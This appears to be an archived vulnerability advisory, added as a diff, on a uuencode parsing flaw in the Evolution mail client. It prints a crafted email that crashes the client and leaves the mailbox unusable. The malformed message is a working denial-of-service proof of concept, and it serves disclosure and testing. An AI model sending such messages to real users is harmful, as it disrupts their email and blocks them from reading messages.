@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/7117/info
+
+The Evolution mail client supports "uuencoded" content and decodes it automatically when a message is initially parsed. A memory corruption error is present in the parsing component that can result in the client crashing when specially malformed content is decoded. The presence of such a message in an Evolution user's mailbox may result in a prolonged denial of service as the crashing of the GUI may prevent deletion of the message. The user will also not be able to read messages while the message is present in their mailbox. It is not yet determined whether this vulnerability may be exploited by remote attackers to compromise client hosts. Users are advised to upgrade despite this uncertainty.
+
+The following email will reproduce this vulnerability, note that
+an empty line is required before and after the UUE header line.
+
+>From xxx@corest.com Wed Mar 5 14:06:02 2003
+Subject: xxx
+From: X X. X <xxx@corest.com>
+To: xxx@corest.com
+Content-Type: multipart/mixed; boundary="=-mTDu5zdJIsixETTwCF5Y"
+Message-Id: <1046884154.1731.5.camel@vaiolin>
+Mime-Version: 1.0
+Date: 05 Mar 2003 14:09:14 -0300
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Disposition: inline; filename=name
+Content-Type: application/octet-stream; name=name
+Content-Transfer-Encoding: 7bit
+
+begin 600
+
+end
+
+--=-mTDu5zdJIsixETTwCF5Y--
